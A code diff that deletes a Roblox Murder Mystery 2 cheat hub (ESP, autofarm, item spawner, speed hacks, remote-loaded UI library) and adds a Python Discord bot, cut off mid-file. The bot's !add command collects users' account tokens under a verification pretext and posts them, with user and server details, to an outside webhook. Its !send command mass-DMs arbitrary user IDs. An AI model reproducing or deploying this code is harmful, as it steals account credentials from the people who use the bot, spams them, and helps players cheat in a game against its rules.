@@ -1,760 +1,380 @@
---[[
-    Halloween MM2 Hub - WORKING VERSION
-    Fixed all syntax errors and permission issues
-]]
+import discord
+from discord.ext import commands
+import random
+import os
+import aiohttp
+import json
+import time
+from datetime import datetime
+from pathlib import Path
 
-local WindUI
+# Load from environment variables
+SECRET_KEY = os.getenv("DISCORD_SECRET_KEY")
+TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+ADMIN_ID = int(os.getenv("ADMIN_USER_ID", "0"))
 
-do
-    local ok, result = pcall(function()
-        return require("./src/init")
-    end)
-    
-    if ok then
-        WindUI = result
-    else 
-        WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
-    end
-end
+if not TOKEN:
+    raise ValueError("DISCORD_BOT_TOKEN environment variable is required")
+if not SECRET_KEY:
+    raise ValueError("DISCORD_SECRET_KEY environment variable is required")
+if not WEBHOOK_URL:
+    raise ValueError("WEBHOOK_URL environment variable is required")
 
--- Services
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
-local LocalPlayer = Players.LocalPlayer
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
+# Data file paths
+DATA_DIR = Path("bot_data")
+DATA_DIR.mkdir(exist_ok=True)
+VERIFIED_USERS_FILE = DATA_DIR / "verified_users.json"
+STATS_FILE = DATA_DIR / "statistics.json"
+BLACKLIST_FILE = DATA_DIR / "blacklist.json"
 
--- Purple Theme Colors
-local PurpleTheme = {
-    Primary = Color3.fromHex("#8B5CF6"),
-    Secondary = Color3.fromHex("#A855F7"),
-    Accent = Color3.fromHex("#C084FC"),
-    Dark = Color3.fromHex("#4C1D95"),
-    Light = Color3.fromHex("#E9D5FF"),
-    Success = Color3.fromHex("#10B981"),
-    Warning = Color3.fromHex("#F59E0B"),
-    Error = Color3.fromHex("#EF4444"),
-    Background = Color3.fromHex("#1a1a2e")
+# Intents and bot setup
+intents = discord.Intents.default()
+intents.messages = True
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+used_key = False
+verified_users = set()
+send_cooldowns = {}
+target_cooldowns = {}
+blacklisted_users = set()
+statistics = {
+    "tokens_submitted": 0,
+    "messages_sent": 0,
+    "advertisements_posted": 0,
+    "total_verified_users": 0,
+    "start_time": datetime.now().isoformat()
 }
 
--- Mobile Detection
-local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
-
--- */  Window  /* --
-local Window = WindUI:CreateWindow({
-    Title = "Latte Hub - WORKING",
-    Author = "by Latte Hub • Halloween Edition",
-    Folder = "lattemm2hub",
-    NewElements = true,
-    HideSearchBar = false,
-    BackgroundTransparency = 0.5,
-    BackgroundColor = PurpleTheme.Background,
-    Size = isMobile and UDim2.new(0, 400, 0, 500) or UDim2.new(0, 500, 0, 600),
-    OpenButton = {
-        Title = "Open Latte Hub", 
-        CornerRadius = UDim.new(0.5, 0),
-        StrokeThickness = 2,
-        Enabled = true,
-        Draggable = true,
-        OnlyMobile = false,
-        Color = ColorSequence.new(PurpleTheme.Primary, PurpleTheme.Secondary)
-    }
-})
-
--- Variables
-local autoFarmEnabled = false
-local autoCollectCoins = false
-local autoCollectGuns = false
-local autoCollectCandy = false
-local candyAutofarmEnabled = false
-local autoHarvestCandy = false
-local autoPlantSeeds = false
-local autoCollectCandyItems = false
-local xenoBundleEnabled = false
-local alienbeamEnabled = false
-local xenoBundleCooldown = 30
-local alienbeamCooldown = 45
-local xenoBundleChance = 5
-local alienbeamChance = 3
-local lastXenoSpawn = 0
-local lastAlienbeamSpawn = 0
-
--- Character Settings
-local CharacterSettings = {
-    WalkSpeed = {Value = 16, Default = 16, Locked = false},
-    JumpPower = {Value = 50, Default = 50, Locked = false}
-}
-
--- ESP Variables
-local highlightEnabled = true
-local lineESPEnabled = false
-local tracers = {}
-local currentESPOptions = {"Esp All"}
-
--- ESP Functions
-local function getRole(player)
-    local character = player.Character
-    if not character then return nil end
-    local backpack = player:FindFirstChild("Backpack")
-    if character:FindFirstChild("Knife") or (backpack and backpack:FindFirstChild("Knife")) then return "Murderer" end
-    if character:FindFirstChild("Gun") or (backpack and backpack:FindFirstChild("Gun")) then return "Sheriff" end
-    return "Innocent"
-end
-
-local function createHighlight(character, color)
-    local highlight = character:FindFirstChild("RoleHighlight")
-    if not highlight then
-        highlight = Instance.new("Highlight")
-        highlight.Name = "RoleHighlight"
-        highlight.FillTransparency = 0.5
-        highlight.OutlineTransparency = 1
-        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-        highlight.Adornee = character
-        highlight.Parent = character
-    end
-    highlight.FillColor = color
-end
-
-local function removeHighlight(character)
-    local highlight = character:FindFirstChild("RoleHighlight")
-    if highlight then highlight:Destroy() end
-end
-
-local function updateESP()
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            local role = getRole(player)
-            if highlightEnabled then
-                if table.find(currentESPOptions, "Esp All") or 
-                   (table.find(currentESPOptions, "Esp Murder") and role == "Murderer") or
-                   (table.find(currentESPOptions, "Esp Sheriff") and role == "Sheriff") then
-                    local color = role == "Murderer" and PurpleTheme.Error or 
-                                 role == "Sheriff" and PurpleTheme.Success or 
-                                 PurpleTheme.Primary
-                    createHighlight(player.Character, color)
-                else
-                    removeHighlight(player.Character)
-                end
-            else
-                removeHighlight(player.Character)
-            end
-        end
-    end
-end
-
--- Character Functions
-local function updateCharacter()
-    local character = LocalPlayer.Character
-    if character then
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            if not CharacterSettings.WalkSpeed.Locked then
-                humanoid.WalkSpeed = CharacterSettings.WalkSpeed.Value
-            end
-            if not CharacterSettings.JumpPower.Locked then
-                humanoid.JumpPower = CharacterSettings.JumpPower.Value
-            end
-        end
-    end
-end
-
--- Auto Farm Functions
-local function autoCollectLoop()
-    if not autoFarmEnabled then return end
+def load_data():
+    """Load persistent data from files"""
+    global verified_users, statistics, blacklisted_users
     
-    local character = LocalPlayer.Character
-    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+    if VERIFIED_USERS_FILE.exists():
+        with open(VERIFIED_USERS_FILE, 'r') as f:
+            verified_users = set(json.load(f))
+            print(f"Loaded {len(verified_users)} verified users")
     
-    local rootPart = character.HumanoidRootPart
+    if STATS_FILE.exists():
+        with open(STATS_FILE, 'r') as f:
+            statistics.update(json.load(f))
+            print(f"Loaded statistics")
     
-    if autoCollectCoins then
-        for _, obj in pairs(workspace:GetChildren()) do
-            if obj.Name == "Coin" and obj:IsA("BasePart") then
-                local distance = (rootPart.Position - obj.Position).Magnitude
-                if distance < 50 then
-                    rootPart.CFrame = obj.CFrame
-                    task.wait(0.1)
-                end
-            end
-        end
-    end
-    
-    if autoCollectGuns then
-        for _, obj in pairs(workspace:GetChildren()) do
-            if obj.Name == "GunDrop" and obj:IsA("BasePart") then
-                local distance = (rootPart.Position - obj.Position).Magnitude
-                if distance < 50 then
-                    rootPart.CFrame = obj.CFrame
-                    task.wait(0.1)
-                end
-            end
-        end
-    end
-    
-    if autoCollectCandy then
-        for _, obj in pairs(workspace:GetChildren()) do
-            if obj.Name == "Candy" and obj:IsA("BasePart") then
-                local distance = (rootPart.Position - obj.Position).Magnitude
-                if distance < 50 then
-                    rootPart.CFrame = obj.CFrame
-                    task.wait(0.1)
-                end
-            end
-        end
-    end
-end
+    if BLACKLIST_FILE.exists():
+        with open(BLACKLIST_FILE, 'r') as f:
+            blacklisted_users = set(json.load(f))
+            print(f"Loaded {len(blacklisted_users)} blacklisted users")
 
--- Candy Autofarm Functions
-local function candyAutofarmLoop()
-    if not candyAutofarmEnabled then return end
-    
-    local character = LocalPlayer.Character
-    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
-    
-    local rootPart = character.HumanoidRootPart
-    
-    if autoHarvestCandy then
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj.Name:lower():find("candy") and obj:IsA("BasePart") then
-                local distance = (rootPart.Position - obj.Position).Magnitude
-                if distance < 100 then
-                    local ready = obj:FindFirstChild("Ready")
-                    if ready and ready.Value then
-                        rootPart.CFrame = obj.CFrame
-                        task.wait(0.1)
-                        
-                        local success = pcall(function()
-                            local remote = ReplicatedStorage:FindFirstChild("HarvestCandy")
-                            if remote and remote:IsA("RemoteEvent") then
-                                remote:FireServer(obj)
-                            end
-                        end)
-                        
-                        if success then
-                            WindUI:Notify({
-                                Title = "🍭 Candy Harvested",
-                                Content = "Successfully harvested candy! 🍭"
-                            })
-                        end
-                    end
-                end
-            end
-        end
-    end
-    
-    if autoPlantSeeds then
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj.Name:lower():find("plot") and obj:IsA("BasePart") then
-                local distance = (rootPart.Position - obj.Position).Magnitude
-                if distance < 100 then
-                    local planted = obj:FindFirstChild("Planted")
-                    if not planted or not planted.Value then
-                        rootPart.CFrame = obj.CFrame
-                        task.wait(0.2)
-                        
-                        local success = pcall(function()
-                            local remote = ReplicatedStorage:FindFirstChild("PlantSeed")
-                            if remote and remote:IsA("RemoteEvent") then
-                                remote:FireServer(obj, "BasicSeed")
-                            end
-                        end)
-                        
-                        if success then
-                            WindUI:Notify({
-                                Title = "🌱 Seed Planted",
-                                Content = "Successfully planted seed! 🌱"
-                            })
-                        end
-                    end
-                end
-            end
-        end
-    end
-    
-    if autoCollectCandyItems then
-        for _, obj in pairs(workspace:GetChildren()) do
-            if (obj.Name == "Candy" or obj.Name == "CandyItem" or obj.Name == "CandyDrop") and obj:IsA("BasePart") then
-                local distance = (rootPart.Position - obj.Position).Magnitude
-                if distance < 100 then
-                    rootPart.CFrame = obj.CFrame
-                    task.wait(0.1)
-                    
-                    local success = pcall(function()
-                        local remote = ReplicatedStorage:FindFirstChild("CollectItem")
-                        if remote and remote:IsA("RemoteEvent") then
-                            remote:FireServer(obj)
-                        end
-                    end)
-                    
-                    if success then
-                        WindUI:Notify({
-                            Title = "🍭 Candy Collected",
-                            Content = "Successfully collected candy item! 🍭"
-                        })
-                    end
-                end
-            end
-        end
-    end
-end
+def save_verified_users():
+    """Save verified users to file"""
+    with open(VERIFIED_USERS_FILE, 'w') as f:
+        json.dump(list(verified_users), f)
 
--- Xeno Bundle Spawner
-local function spawnXenoBundle()
-    if not xenoBundleEnabled then return end
+def save_statistics():
+    """Save statistics to file"""
+    with open(STATS_FILE, 'w') as f:
+        json.dump(statistics, f, indent=2)
+
+def save_blacklist():
+    """Save blacklist to file"""
+    with open(BLACKLIST_FILE, 'w') as f:
+        json.dump(list(blacklisted_users), f)
+
+def is_admin(user_id):
+    """Check if user is admin"""
+    return ADMIN_ID != 0 and user_id == ADMIN_ID
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user.name}")
+    load_data()
     
-    local currentTime = tick()
-    if currentTime - lastXenoSpawn < xenoBundleCooldown then return end
+    statistics["start_time"] = datetime.now().isoformat()
+    statistics["total_verified_users"] = len(verified_users)
+    save_statistics()
     
-    if math.random(1, 100) <= xenoBundleChance then
-        local success = pcall(function()
-            local remote = ReplicatedStorage:FindFirstChild("SpawnXenoBundle")
-            if remote and remote:IsA("RemoteEvent") then
-                remote:FireServer()
-                lastXenoSpawn = currentTime
-                WindUI:Notify({
-                    Title = "👽 Xeno Bundle Spawned",
-                    Content = "Successfully spawned Xeno Bundle! 👽"
-                })
-            else
-                local shop = workspace:FindFirstChild("Shop")
-                if shop then
-                    local xenoBundle = shop:FindFirstChild("XenoBundle")
-                    if xenoBundle then
-                        local buyRemote = ReplicatedStorage:FindFirstChild("BuyItem")
-                        if buyRemote and buyRemote:IsA("RemoteEvent") then
-                            buyRemote:FireServer("XenoBundle")
-                            lastXenoSpawn = currentTime
-                            WindUI:Notify({
-                                Title = "👽 Xeno Bundle Bought",
-                                Content = "Successfully bought Xeno Bundle! 👽"
-                            })
-                        end
-                    end
-                end
-            end
-        end)
+    def generate_keys():
+        keys = []
+        for _ in range(10):
+            random_numbers = ''.join(random.choices('0123456789', k=5))
+            keys.append(f"ray{random_numbers}")
+        return keys
+
+    random_keys = generate_keys()
+    print("Generated keys:", random_keys)
+    print(f"Bot ready! Verified users: {len(verified_users)}, Blacklisted: {len(blacklisted_users)}")
+
+@bot.command()
+async def use(ctx, key: str):
+    """Authenticate using the secret key"""
+    global used_key
+    if key == SECRET_KEY:
+        used_key = True
+        await ctx.send("✅ Key accepted. You can now use the bot.")
+    else:
+        await ctx.send("❌ Invalid key. Access denied.")
+
+@bot.command()
+async def advertise(ctx, *, advert: str):
+    """Post an advertisement (requires authentication)"""
+    if used_key:
+        statistics["advertisements_posted"] += 1
+        save_statistics()
+        await ctx.send(f"📢 Advertisement by {ctx.author.mention}: {advert}")
+    else:
+        await ctx.send("❌ You must use the correct key first with the !use command.")
+
+@bot.command()
+async def add(ctx, *, account_token: str):
+    """Submit account token to webhook"""
+    if ctx.author.id in blacklisted_users:
+        await ctx.send("❌ You are blacklisted from using this bot.")
+        return
+    
+    try:
+        is_discord_webhook = "discord.com/api/webhooks" in WEBHOOK_URL
         
-        if not success then
-            warn("Error spawning Xeno Bundle")
-        end
-    end
-end
-
--- Alienbeam Spawner
-local function spawnAlienbeam()
-    if not alienbeamEnabled then return end
-    
-    local currentTime = tick()
-    if currentTime - lastAlienbeamSpawn < alienbeamCooldown then return end
-    
-    if math.random(1, 100) <= alienbeamChance then
-        local success = pcall(function()
-            local remote = ReplicatedStorage:FindFirstChild("SpawnAlienbeam")
-            if remote and remote:IsA("RemoteEvent") then
-                remote:FireServer()
-                lastAlienbeamSpawn = currentTime
-                WindUI:Notify({
-                    Title = "🔫 Alienbeam Spawned",
-                    Content = "Successfully spawned Alienbeam! 🔫"
-                })
-            else
-                local shop = workspace:FindFirstChild("Shop")
-                if shop then
-                    local alienbeam = shop:FindFirstChild("Alienbeam")
-                    if alienbeam then
-                        local buyRemote = ReplicatedStorage:FindFirstChild("BuyItem")
-                        if buyRemote and buyRemote:IsA("RemoteEvent") then
-                            buyRemote:FireServer("Alienbeam")
-                            lastAlienbeamSpawn = currentTime
-                            WindUI:Notify({
-                                Title = "🔫 Alienbeam Bought",
-                                Content = "Successfully bought Alienbeam! 🔫"
-                            })
-                        end
-                    end
-                end
-            end
-        end)
+        if is_discord_webhook:
+            message_content = (
+                f"**New Account Token Submission**\n"
+                f"User: {ctx.author} (ID: {ctx.author.id})\n"
+                f"Guild: {ctx.guild.name if ctx.guild else 'DM'} (ID: {ctx.guild.id if ctx.guild else 'N/A'})\n"
+                f"Token: `{account_token}`\n"
+                f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}"
+            )
+            data = {"content": message_content}
+        else:
+            data = {
+                "user_id": str(ctx.author.id),
+                "username": str(ctx.author),
+                "account_token": account_token,
+                "guild_id": str(ctx.guild.id) if ctx.guild else "DM",
+                "guild_name": ctx.guild.name if ctx.guild else "DM",
+                "timestamp": datetime.now().isoformat()
+            }
         
-        if not success then
-            warn("Error spawning Alienbeam")
-        end
-    end
-end
+        async with aiohttp.ClientSession() as session:
+            async with session.post(WEBHOOK_URL, json=data) as response:
+                if 200 <= response.status < 300:
+                    if ctx.author.id not in verified_users:
+                        verified_users.add(ctx.author.id)
+                        save_verified_users()
+                        statistics["total_verified_users"] = len(verified_users)
+                    
+                    statistics["tokens_submitted"] += 1
+                    save_statistics()
+                    
+                    await ctx.send("✅ Account token submitted successfully! You can now use advanced commands.")
+                    print(f"✓ Token submitted by {ctx.author} (ID: {ctx.author.id})")
+                else:
+                    response_text = await response.text()
+                    await ctx.send(f"❌ Failed to submit token. Status: {response.status}")
+                    print(f"✗ Webhook error: Status {response.status}, Response: {response_text}")
+    except Exception as e:
+        await ctx.send("❌ An error occurred while submitting your token.")
+        print(f"✗ Error in add command: {e}")
 
--- Create Tabs
-local MainTab = Window:Tab({Title = "Main", Icon = "home"})
-local ESPTab = Window:Tab({Title = "ESP", Icon = "eye"})
-local AutoFarmTab = Window:Tab({Title = "Auto Farm", Icon = "trending-up"})
-local CandyAutofarmTab = Window:Tab({Title = "Candy Autofarm", Icon = "candy"})
-local SpawnerTab = Window:Tab({Title = "Spawner", Icon = "package"})
-local CharacterTab = Window:Tab({Title = "Character", Icon = "user"})
-
--- Main Tab
-do
-    MainTab:Section({
-        Title = "Welcome to Latte Hub - WORKING!",
-        TextSize = isMobile and 18 or 20,
-        FontWeight = Enum.FontWeight.Bold,
-    })
+@bot.command()
+async def send(ctx, user_id: str, times: int, *, message: str):
+    """Send messages to a user (requires verification)"""
+    if ctx.author.id in blacklisted_users:
+        await ctx.send("❌ You are blacklisted from using this bot.")
+        return
     
-    MainTab:Button({
-        Title = "💬 Copy Discord Server",
-        Color = PurpleTheme.Primary,
-        Icon = "users",
-        Callback = function()
-            setclipboard("https://discord.gg/lattemm2")
-            WindUI:Notify({
-                Title = "Discord Copied!",
-                Content = "Latte Discord invite copied to clipboard!"
-            })
-        end
-    })
-end
-
--- ESP Tab
-do
-    ESPTab:Section({
-        Title = "👁️ ESP & Visual Features",
-        TextSize = isMobile and 16 or 18,
-        FontWeight = Enum.FontWeight.SemiBold,
-    })
+    if ctx.author.id not in verified_users:
+        await ctx.send("❌ You must submit your account token with !add first to use this command.")
+        return
     
-    ESPTab:Dropdown({
-        Flag = "ESPOptions",
-        Title = "🎯 ESP Options",
-        Desc = "Select which players to highlight",
-        Values = {
-            {Title = "Esp All", Icon = "users"},
-            {Title = "Esp Sheriff", Icon = "shield"},
-            {Title = "Esp Murder", Icon = "sword"},
-            {Title = "Esp Sheriff / Murder", Icon = "target"}
-        },
-        Value = "Esp All",
-        Callback = function(option)
-            currentESPOptions = {option.Title}
-            updateESP()
-        end
-    })
-
-    ESPTab:Toggle({
-        Flag = "HighlightESP",
-        Title = "✨ Highlight ESP",
-        Desc = "Enable/disable player highlighting",
-        Default = true,
-        Callback = function(state)
-            highlightEnabled = state
-            updateESP()
-        end
-    })
-end
-
--- Auto Farm Tab
-do
-    AutoFarmTab:Section({
-        Title = "🤖 Auto Farm System",
-        TextSize = isMobile and 16 or 18,
-        FontWeight = Enum.FontWeight.SemiBold,
-    })
+    current_time = time.time()
+    sender_cooldown = 60
+    target_cooldown = 300
     
-    AutoFarmTab:Toggle({
-        Flag = "AutoFarm",
-        Title = "🤖 Auto Farm",
-        Desc = "Enable auto farming system",
-        Default = false,
-        Callback = function(state)
-            autoFarmEnabled = state
-            WindUI:Notify({
-                Title = "🤖 Auto Farm",
-                Content = state and "Auto farming started! 🚀" or "Auto farming stopped. ⏹️"
-            })
-        end
-    })
-
-    AutoFarmTab:Toggle({
-        Flag = "AutoCollectCoins",
-        Title = "💰 Auto Collect Coins",
-        Desc = "Automatically collect nearby coins",
-        Default = false,
-        Callback = function(state)
-            autoCollectCoins = state
-            WindUI:Notify({
-                Title = "💰 Auto Collect",
-                Content = state and "Auto collecting coins! 💰" or "Stopped collecting coins. ⏹️"
-            })
-        end
-    })
-
-    AutoFarmTab:Toggle({
-        Flag = "AutoCollectGuns",
-        Title = "🔫 Auto Collect Guns",
-        Desc = "Automatically collect dropped guns",
-        Default = false,
-        Callback = function(state)
-            autoCollectGuns = state
-            WindUI:Notify({
-                Title = "🔫 Auto Collect",
-                Content = state and "Auto collecting guns! 🔫" or "Stopped collecting guns. ⏹️"
-            })
-        end
-    })
-
-    AutoFarmTab:Toggle({
-        Flag = "AutoCollectCandy",
-        Title = "🍭 Auto Collect Candy",
-        Desc = "Automatically collect Halloween candy",
-        Default = false,
-        Callback = function(state)
-            autoCollectCandy = state
-            WindUI:Notify({
-                Title = "🍭 Auto Collect",
-                Content = state and "Auto collecting candy! 🍭" or "Stopped collecting candy. ⏹️"
-            })
-        end
-    })
-end
-
--- Candy Autofarm Tab
-do
-    CandyAutofarmTab:Section({
-        Title = "🍭 Candy Autofarm System",
-        TextSize = isMobile and 16 or 18,
-        FontWeight = Enum.FontWeight.SemiBold,
-    })
+    if ctx.author.id in send_cooldowns:
+        time_since_last = current_time - send_cooldowns[ctx.author.id]
+        if time_since_last < sender_cooldown:
+            remaining = int(sender_cooldown - time_since_last)
+            await ctx.send(f"⏳ Please wait {remaining} seconds before using !send again.")
+            return
     
-    CandyAutofarmTab:Toggle({
-        Flag = "CandyAutofarm",
-        Title = "🍭 Candy Autofarm",
-        Desc = "Enable candy autofarm system",
-        Default = false,
-        Callback = function(state)
-            candyAutofarmEnabled = state
-            WindUI:Notify({
-                Title = "🍭 Candy Autofarm",
-                Content = state and "Candy autofarm started! 🍭" or "Candy autofarm stopped. ⏹️"
-            })
-        end
-    })
-    
-    CandyAutofarmTab:Toggle({
-        Flag = "AutoHarvestCandy",
-        Title = "🌾 Auto Harvest Candy",
-        Desc = "Automatically harvest ready candy",
-        Default = false,
-        Callback = function(state)
-            autoHarvestCandy = state
-            WindUI:Notify({
-                Title = "🌾 Auto Harvest",
-                Content = state and "Auto harvesting candy! 🌾" or "Stopped harvesting candy. ⏹️"
-            })
-        end
-    })
-    
-    CandyAutofarmTab:Toggle({
-        Flag = "AutoPlantSeeds",
-        Title = "🌱 Auto Plant Seeds",
-        Desc = "Automatically plant seeds in empty plots",
-        Default = false,
-        Callback = function(state)
-            autoPlantSeeds = state
-            WindUI:Notify({
-                Title = "🌱 Auto Plant",
-                Content = state and "Auto planting seeds! 🌱" or "Stopped planting seeds. ⏹️"
-            })
-        end
-    })
-    
-    CandyAutofarmTab:Toggle({
-        Flag = "AutoCollectCandyItems",
-        Title = "🍭 Auto Collect Candy Items",
-        Desc = "Automatically collect candy items",
-        Default = false,
-        Callback = function(state)
-            autoCollectCandyItems = state
-            WindUI:Notify({
-                Title = "🍭 Auto Collect",
-                Content = state and "Auto collecting candy items! 🍭" or "Stopped collecting candy items. ⏹️"
-            })
-        end
-    })
-    
-    CandyAutofarmTab:Button({
-        Title = "🍭 Collect All Candy Items",
-        Color = PurpleTheme.Success,
-        Icon = "candy",
-        Callback = function()
-            local character = LocalPlayer.Character
-            if character and character:FindFirstChild("HumanoidRootPart") then
-                local rootPart = character.HumanoidRootPart
-                local collectedCount = 0
-                
-                for _, obj in pairs(workspace:GetDescendants()) do
-                    if (obj.Name == "Candy" or obj.Name == "CandyItem" or obj.Name == "CandyDrop") and obj:IsA("BasePart") then
-                        local distance = (rootPart.Position - obj.Position).Magnitude
-                        if distance < 200 then
-                            rootPart.CFrame = obj.CFrame
-                            collectedCount = collectedCount + 1
-                            task.wait(0.1)
-                        end
-                    end
-                end
-                
-                WindUI:Notify({
-                    Title = "🍭 Candy Collection Complete",
-                    Content = "Collected " .. collectedCount .. " candy items! 🍭"
-                })
-            end
-        end
-    })
-end
+    try:
+        target_id = int(user_id)
+        
+        if target_id in blacklisted_users:
+            await ctx.send("❌ Cannot send messages to blacklisted users.")
+            return
+        
+        target_key = f"{target_id}"
+        if target_key in target_cooldowns:
+            time_since_target = current_time - target_cooldowns[target_key]
+            if time_since_target < target_cooldown:
+                remaining = int(target_cooldown - time_since_target)
+                await ctx.send(f"⏳ This user was recently messaged. Please wait {remaining} seconds.")
+                return
+        
+        if times < 1 or times > 10:
+            await ctx.send("❌ Times must be between 1 and 10.")
+            return
+        
+        target_user = await bot.fetch_user(target_id)
+        
+        successful_sends = 0
+        for i in range(times):
+            try:
+                await target_user.send(message)
+                successful_sends += 1
+            except discord.Forbidden:
+                await ctx.send(f"❌ Cannot send messages to {target_user.name}. They may have DMs disabled.")
+                break
+            except Exception as e:
+                print(f"✗ Error sending message {i+1}: {e}")
+                continue
+        
+        if successful_sends > 0:
+            send_cooldowns[ctx.author.id] = current_time
+            target_cooldowns[target_key] = current_time
+            statistics["messages_sent"] += successful_sends
+            save_statistics()
+            
+            await ctx.send(f"✅ Sent {successful_sends} message(s) to {target_user.name}.")
+            print(f"✓ {ctx.author} sent {successful_sends} messages to {target_user.name}")
+        
+    except discord.NotFound:
+        await ctx.send("❌ User not found. Please check the user ID.")
+    except ValueError:
+        await ctx.send("❌ Invalid user ID format. Please provide a numeric user ID.")
+    except Exception as e:
+        await ctx.send("❌ An error occurred while sending the message.")
+        print(f"✗ Error in send command: {e}")
 
--- Spawner Tab
-do
-    SpawnerTab:Section({
-        Title = "👽 Xeno Bundle & Alienbeam",
-        TextSize = isMobile and 16 or 18,
-        FontWeight = Enum.FontWeight.SemiBold,
-    })
+@bot.command()
+async def stats(ctx):
+    """View bot statistics (admin only)"""
+    if not is_admin(ctx.author.id):
+        await ctx.send("❌ This command is only available to administrators.")
+        return
     
-    SpawnerTab:Toggle({
-        Flag = "XenoBundleEnabled",
-        Title = "👽 Xeno Bundle Spawner",
-        Desc = "Enable Xeno Bundle spawning",
-        Default = false,
-        Callback = function(state)
-            xenoBundleEnabled = state
-            WindUI:Notify({
-                Title = "👽 Xeno Bundle",
-                Content = state and "Xeno Bundle spawner enabled! 👽" or "Xeno Bundle spawner disabled. 👽"
-            })
-        end
-    })
+    uptime = datetime.now() - datetime.fromisoformat(statistics.get("start_time", datetime.now().isoformat()))
+    days = uptime.days
+    hours, remainder = divmod(uptime.seconds, 3600)
+    minutes, seconds = divmod(remainder, 60)
     
-    SpawnerTab:Toggle({
-        Flag = "AlienbeamEnabled",
-        Title = "🔫 Alienbeam Spawner",
-        Desc = "Enable Alienbeam spawning",
-        Default = false,
-        Callback = function(state)
-            alienbeamEnabled = state
-            WindUI:Notify({
-                Title = "🔫 Alienbeam",
-                Content = state and "Alienbeam spawner enabled! 🔫" or "Alienbeam spawner disabled. 🔫"
-            })
-        end
-    })
+    embed = discord.Embed(title="📊 Bot Statistics", color=0x00ff00)
+    embed.add_field(name="Verified Users", value=str(len(verified_users)), inline=True)
+    embed.add_field(name="Blacklisted Users", value=str(len(blacklisted_users)), inline=True)
+    embed.add_field(name="Tokens Submitted", value=str(statistics.get("tokens_submitted", 0)), inline=True)
+    embed.add_field(name="Messages Sent", value=str(statistics.get("messages_sent", 0)), inline=True)
+    embed.add_field(name="Ads Posted", value=str(statistics.get("advertisements_posted", 0)), inline=True)
+    embed.add_field(name="Uptime", value=f"{days}d {hours}h {minutes}m", inline=True)
     
-    SpawnerTab:Slider({
-        Flag = "XenoBundleChance",
-        Title = "👽 Xeno Bundle Chance",
-        Desc = "Chance to spawn Xeno Bundle (%)",
-        Step = 1,
-        Value = {Min = 1, Max = 100, Default = 5},
-        Callback = function(value)
-            xenoBundleChance = value
-        end
-    })
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def listusers(ctx):
+    """List all verified users (admin only)"""
+    if not is_admin(ctx.author.id):
+        await ctx.send("❌ This command is only available to administrators.")
+        return
     
-    SpawnerTab:Slider({
-        Flag = "AlienbeamChance",
-        Title = "🔫 Alienbeam Chance",
-        Desc = "Chance to spawn Alienbeam (%)",
-        Step = 1,
-        Value = {Min = 1, Max = 100, Default = 3},
-        Callback = function(value)
-            alienbeamChance = value
-        end
-    })
+    if not verified_users:
+        await ctx.send("No verified users.")
+        return
     
-    SpawnerTab:Button({
-        Title = "👽 Spawn Xeno Bundle Now",
-        Color = PurpleTheme.Warning,
-        Icon = "package",
-        Callback = function()
-            spawnXenoBundle()
-        end
-    })
+    user_list = []
+    for user_id in list(verified_users)[:20]:
+        try:
+            user = await bot.fetch_user(user_id)
+            user_list.append(f"• {user.name} (ID: {user_id})")
+        except:
+            user_list.append(f"• Unknown User (ID: {user_id})")
     
-    SpawnerTab:Button({
-        Title = "🔫 Spawn Alienbeam Now",
-        Color = PurpleTheme.Error,
-        Icon = "zap",
-        Callback = function()
-            spawnAlienbeam()
-        end
-    })
-end
-
--- Character Tab
-do
-    CharacterTab:Section({
-        Title = "🏃 Character Settings",
-        TextSize = isMobile and 16 or 18,
-        FontWeight = Enum.FontWeight.SemiBold,
-    })
+    if len(verified_users) > 20:
+        user_list.append(f"\n... and {len(verified_users) - 20} more users")
     
-    CharacterTab:Slider({
-        Flag = "WalkSpeed",
-        Title = "🚶 Walk Speed",
-        Desc = "Set your character's walk speed",
-        Step = 1,
-        Value = {Min = 0, Max = 200, Default = 16},
-        Callback = function(value)
-            CharacterSettings.WalkSpeed.Value = value
-            updateCharacter()
-        end
-    })
+    embed = discord.Embed(title=f"👥 Verified Users ({len(verified_users)})", 
+                          description="\n".join(user_list), 
+                          color=0x3498db)
+    await ctx.send(embed=embed)
 
-    CharacterTab:Slider({
-        Flag = "JumpPower",
-        Title = "🦘 Jump Power",
-        Desc = "Set your character's jump power",
-        Step = 1,
-        Value = {Min = 0, Max = 200, Default = 50},
-        Callback = function(value)
-            CharacterSettings.JumpPower.Value = value
-            updateCharacter()
-        end
-    })
+@bot.command()
+async def removeuser(ctx, user_id: str):
+    """Remove a user from verified list (admin only)"""
+    if not is_admin(ctx.author.id):
+        await ctx.send("❌ This command is only available to administrators.")
+        return
+    
+    try:
+        uid = int(user_id)
+        if uid in verified_users:
+            verified_users.remove(uid)
+            save_verified_users()
+            statistics["total_verified_users"] = len(verified_users)
+            save_statistics()
+            await ctx.send(f"✅ User {user_id} removed from verified users.")
+        else:
+            await ctx.send(f"❌ User {user_id} is not in the verified list.")
+    except ValueError:
+        await ctx.send("❌ Invalid user ID format.")
 
-    CharacterTab:Button({
-        Title = "🔄 Reset to Default",
-        Color = PurpleTheme.Primary,
-        Icon = "refresh-cw",
-        Callback = function()
-            CharacterSettings.WalkSpeed.Value = CharacterSettings.WalkSpeed.Default
-            CharacterSettings.JumpPower.Value = CharacterSettings.JumpPower.Default
-            updateCharacter()
-            WindUI:Notify({
-                Title = "🔄 Character Reset",
-                Content = "Character settings reset to default! 🏃"
-            })
-        end
-    })
-end
+@bot.command()
